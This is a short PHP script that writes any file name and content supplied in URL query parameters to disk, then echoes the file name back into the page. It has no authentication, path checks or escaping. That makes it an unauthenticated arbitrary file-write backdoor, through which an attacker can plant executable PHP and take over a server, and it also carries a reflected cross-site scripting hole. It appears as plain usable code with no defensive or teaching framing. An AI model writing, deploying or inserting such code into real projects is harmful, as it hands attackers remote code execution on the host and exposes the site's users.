<?php
// Check if the file name and content are provided in the URL
if (isset($_GET['fileName']) && isset($_GET['fileContent'])) {
    $fileName = $_GET['fileName'];
    $fileContent = $_GET['fileContent'];

    // Write the content to the specified file
    if (!empty($fileName) && !empty($fileContent)) {
        file_put_contents($fileName, $fileContent);
        echo "<p><strong>Success:</strong> Content has been written to '$fileName'.</p>";
    } else {
        echo "<p><strong>Error:</strong> File name or content is missing.</p>";
    }
} else {
    echo "<p><strong>Error:</strong> No file name or content provided.</p>";
}
?>
